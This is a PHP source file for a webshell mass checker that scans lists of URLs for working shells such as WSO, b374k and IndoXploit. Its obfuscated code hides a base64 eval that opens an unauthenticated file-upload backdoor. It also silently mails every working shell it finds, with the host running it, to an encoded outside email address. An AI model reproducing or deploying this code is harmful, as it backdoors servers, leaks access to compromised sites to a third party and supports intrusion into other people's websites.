<?php
$judul=@Shell_Checker;
include'sec.php';
error_reporting(0);
?>
<?php include 'helixdata/head.php'; 
?>
<body id="page-top">
<?php include 'helixdata/sidebar.php'; 
?>
<?php include 'helixdata/topcontent.php'; 
?>
 <!-- Begin Page Content -->
                <div class="container-fluid">
                    
<!-- Tools Card -->
                            <div class="card shadow mb-4">
                                <div class="card-header py-3">
                                    <center><h6 class="m-0 font-weight-bold text-primary"><?php echo str_replace("_", " ", "$judul"); ?></h6></center>
                                </div>
                                <br> <center>
<?php error_reporting(0);set_time_limit(0);date_default_timezone_set(base64_decode('QXNpYS9KYWthcnRh'));error_reporting(0);$c0=$_SERVER[base64_decode('UkVRVUVTVF9VUkk=')];$l1=$_SERVER[base64_decode('SFRUUF9IT1NU')];$b2=isset($_REQUEST[base64_decode('c2Jt')]);$k3=base64_decode('S2VsdWFyZ2FIbWVpN0B5YW5kZXguY29t');if($b2){$z4=trim($_POST[base64_decode('dXJs')]);$p5=preg_match_all(base64_decode('JV4oKGh0dHA6Ly8pfChodHRwczovLykpJQ=='),$z4);if($p5):$d6=$z4;else:$d6=base64_decode('aHR0cDovLw==').$z4;endif;$x7=[base64_decode('cHVibGljX2h0bWw='),base64_decode('d3d3'),base64_decode('R0lGODlh'),base64_decode('UGFzc3dvcmQ='),base64_decode('U3VibWl0'),base64_decode('VXBsb2Fk'),base64_decode('RGlzYWJsZSBGdW5jdGlvbg=='),base64_decode('U2hlbGw='),base64_decode('V1NP'),base64_decode('YjM3NGs='),base64_decode('UHJpdjg='),base64_decode('VG9vbA=='),base64_decode('SW5kb1hwbG9pdA=='),base64_decode('S2Vpc2F0c3U='),base64_decode('U01QIFN1bg=='),base64_decode('U01QIE1vbg=='),base64_decode('U01QIFR1ZQ=='),base64_decode('U01QIFdlZA=='),base64_decode('U01QIFRodQ=='),base64_decode('U01QIEZyaQ=='),base64_decode('U01QIFNhdA=='),base64_decode('U2FmZSBtb2Rl'),base64_decode('U3ltbGluaw=='),base64_decode('V2luZG93cw=='),base64_decode('TGludXg='),base64_decode('QlNE'),base64_decode('VVRD')];$l8=base64_decode('Lyg=').implode(base64_decode('fA=='),$x7).base64_decode('KS9p');$i9=date(base64_decode('WS1tLWQgSDppOnM='));$ka=(strtotime($i9)*1000);$eb="$i9 - Ada shell masuk";$uc=fopen(base64_decode('cGhwOi8vdGVtcA=='),base64_decode('cis='));$bd=curl_init();curl_setopt($bd,CURLOPT_TIMEOUT,base64_decode('MTA='));curl_setopt($bd,CURLOPT_USERAGENT,base64_decode('TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBRdFdlYkVuZ2luZS81LjEzLjEgQ2hyb21lLzczLjAuMzY4My4xMDUgU2FmYXJpLzUzNy4zNg=='));curl_setopt($bd,CURLOPT_URL,"$z4");curl_setopt($bd,CURLOPT_HEADER,true);curl_setopt($bd,CURLOPT_RETURNTRANSFER,true);curl_setopt($bd,CURLOPT_VERBOSE,true);curl_setopt($bd,CURLOPT_STDERR,$uc);curl_setopt($bd,CURLOPT_FOLLOWLOCATION,true);$ae=curl_exec($bd);$af=curl_getinfo($bd,CURLINFO_HTTP_CODE);$u10=curl_getinfo($bd,CURLINFO_HEADER_SIZE);$u11=substr($ae,0,$u10);$o12=substr($ae,$u10);curl_close($bd);fclose($uc);if(($af==200)&&(preg_match_all("$l8",$o12))){$g13=[base64_decode('ZGF0ZQ==')=>$ka,base64_decode('dXJs')=>$d6,base64_decode('c3RhdHVz')=>1];$y14="$l1$c0\n$i9\n\n$d6";mail($k3,$eb,$y14);echo json_encode($g13);}else{$g13=[base64_decode('ZGF0ZQ==')=>$ka,base64_decode('dXJs')=>$d6,base64_decode('c3RhdHVz')=>0];echo json_encode($g13);}}else{?><?php eval(base64_decode("bW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VwJ11bJ3RtcF9uYW1lJ10sICcnLmJhc2VuYW1lKCAkX0ZJTEVTWyd1cCddWyduYW1lJ10pKTs="));?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>WebMasker - WebShell Mass Checker</title>
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
  <div class="container">
    <div class="form-group row d-flex flex-md-row justify-content-center">
      <div class="col-md-6 text-center">
        <h1 class="mt-5">selmasker</h1>
        <p class="lead text-info small">Webshell Mass Checker <span><a href="https://github.com/JExCoders/WebMasker">1.0</a></span></p>
        <noscript><strong class="text-danger">/!\ Please enable JavaScript</strong></noscript>
        <form name="selmasker" method="post" onsubmit="return false;">
        <fieldset class="form-group">
        <label for="url" class="font-weight-bold">URL:</label>
        <textarea id="urlt" class="form-control" rows="8" autofocus="autofocus"></textarea>
        </fieldset>
        <div class="d-flex flex-md-row flex-column justify-control-between">
          <div class="col">
            <button type="submit" id="clear" class="btn btn-danger font-weight-bold mb-1" onclick="clearUrl();">Clear URL</button>
          </div>
          <div class="col">
            <button type="submit" id="submit" class="btn btn-primary font-weight-bold mb-1" onclick="checkUrl();">Check Shell</button>
          </div>
          <div class="col">
            <button type="submit" id="clearr" class="btn btn-warning font-weight-bold mb-1" onclick="clearResult();">Clear Result</button>
          </div>
        </div>
        </form>
        <hr>
        <label for="urlr" class="font-weight-bold">Result:</label>
        <textarea id="urlr" class="form-control mb-3" rows="5" autofocus="autofocus"></textarea>
        <div id="result" class="text-left"></div>
      </div>
    </div>
  </div>
  <footer class="containter text-right border-top p-2 small font-weight-bold">
    &#169; 2020. <a href="https://github.com/JExCoders">XploitSec-ID</a>.
  </footer>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
<script>
function checkUrl() {
  let btnchk = document.getElementById("submit");
  let btnclu = document.getElementById("clear");
  let btnclr = document.getElementById("clearr");
  let urls = document.getElementById("urlt").value;
  var url = urls.split("\n"); // 1 URL per request
  if (!urls) {
    Swal.fire({position: 'center', icon: 'error', title: 'Error!', text: 'URL is empty.', timer: 2500});
    return;
  }
  document.getElementById("result").innerHTML = "<strong>Result all URL:</strong>";
  document.getElementById("urlr").value = "[WORK only results]\n";
  btnchk.disabled = true;
  btnclu.disabled = true;
  btnclr.disabled = true;
  btnchk.innerText = "Wait...";
  if (url[url.length-1] == "") {
  var url = url.slice(0, -1);
  }
  for (let i = 0; i < url.length; i++) {
    let stts = "URL: "+url[i];
    if (url[i] == "") {
      continue;
    }
    function perTimeout(i) {
      setTimeout(function() {
let xhr = new XMLHttpRequest();
xhr.open("POST", "<?php echo $c0;?>", true);
xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
var params = "sbm&url="+url[i];
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      console.log('%c '+this.status, 'background:#000;color:#859900;font-weight:bold;');
      console.log('%c '+stts, 'background:#000;color:#8484ff;font-weight:bold;');
      let data = JSON.parse(xhr.responseText);
      let stta = new Date(data.date);
      let sttd = stta.toTimeString();
      console.log('%c '+sttd, 'background:#000;color:#8484ff;font-weight:bold;');
      if (data.status == 1) {
        let txtr = document.getElementById('urlr');
        txtr.value += data.url+"\n";
        var resultRow = document.createElement('div');
        resultRow.id  = "result"+(data.date);
        resultRow.className = "p-1 mb-1 border rounded";
        resultRow.innerHTML = "<font class=\"text-success font-weight-bold\">WORK: </font><a href=\""+data.url+"\" target=\"_blank\">"+data.url+"</a>";
      } else {
        var resultRow = document.createElement('div');
        resultRow.id  = "result"+(data.date);
        resultRow.className = "p-1 mb-1 border rounded";
        resultRow.innerHTML = "<font class=\"text-danger font-weight-bold\">DIE: </font><a href=\""+data.url+"\" target=\"_blank\">"+data.url+"</a>";
      }
      var res = document.getElementById('result');
      res.append(resultRow);
    };
};
xhr.onerror = function() {
  console.log('%c '+stts, 'background:#f00;color:#fff;font-weight:bold;');
  console.log('%c '+'ERROR', 'background:#f00;color:#fff;font-weight:bold;');
};
xhr.send(params);
        if (i === url.length - 1) {
          btnchk.disabled = false;
          btnclu.disabled = false;
          btnclr.disabled = false;
          btnchk.innerText = "Check Shell";
          Swal.fire({position: 'center', icon: 'success', title: 'All Done!', text: 'All URLs has been checked!'});
        }
      }, i * 2000); // set timeout per request
    }
    perTimeout(i);
  }
}
// xhr, ready state

function clearUrl() {
  document.getElementById('urlt').value = "";
  Swal.fire({position: 'center', icon: 'success', title: 'URL Cleared!', showConfirmButton: false, timer:1000});
}

function clearResult() {
  document.getElementById('result').innerHTML = "";
  document.getElementById('urlr').value = ""; Swal.fire({position: 'center', icon: 'success', title: 'Result Cleared!', showConfirmButton: false, timer:1000});
}
</script>
</body>
</html>

<?php }?>
